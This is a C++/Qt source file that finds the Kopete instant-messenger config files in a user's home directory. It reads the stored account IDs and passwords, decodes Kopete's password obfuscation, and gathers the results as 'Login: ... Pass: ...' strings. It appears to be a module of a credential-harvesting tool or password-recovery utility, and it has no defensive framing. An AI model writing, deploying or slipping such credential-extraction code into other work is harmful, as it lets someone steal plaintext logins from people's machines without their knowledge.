#include "kopete.h"

#include <QFile>
#include <QTextStream>

#include "common.h"


kopete::kopete()
{
    findConfig();
}

QString kopete::decodePassword(const QString &pass)
{
   QString result;
   const QChar *unicode = pass.unicode();
   for (int i = 0; i < pass.length(); ++i)
     result += (unicode[i].unicode() < 0x21) ? unicode[i] : QChar(0x1001F - unicode[i].unicode());
   return result;
}

void kopete::decoding(const QString &path)
{
  QFile file(path);
  if (!file.open(QIODevice::ReadOnly | QIODevice::Text))
         return;
  QString login;
  QString pass;
  QTextStream in(&file);
     while (!in.atEnd())
  {
         QString line = in.readLine();
         if (line.startsWith("AccountId="))
            login = line.right(line.length() - 10);
         if (line.startsWith("Password=")){
            pass = decodePassword(line.right(line.length() - 9));
            decoded.append("Login: " + login + " Pass: " + pass);
            pass.clear();
            login.clear();
        }
     }
}

void kopete::findConfig()
{
  QFile file(homeDir() + ".kde4/share/config/kopeterc");
  if (file.exists())
      decoding(file.fileName());
  file.setFileName(homeDir() + ".kde/share/config/kopeterc");
  if (file.exists())
      decoding(file.fileName());
}
